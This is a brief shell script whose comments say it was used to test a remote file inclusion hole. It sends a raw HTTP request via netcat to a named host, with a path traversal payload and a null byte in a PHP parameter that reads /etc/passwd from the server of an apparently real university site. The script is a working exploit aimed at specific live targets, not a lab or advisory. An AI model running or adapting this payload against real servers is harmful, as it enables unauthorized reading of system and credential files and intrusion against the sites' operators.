#!/bin/sh

# used this code to test a vulnerability that let a remote attacker include
# /etc/passwd
# the toughest part to find was a damn ASCII null code -- %00!!

echo 'GET /pg_behavioralscience.php?program_name=../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1
host: degrees.ashford.edu
' | nc qa2hollywood.datamark.com 80
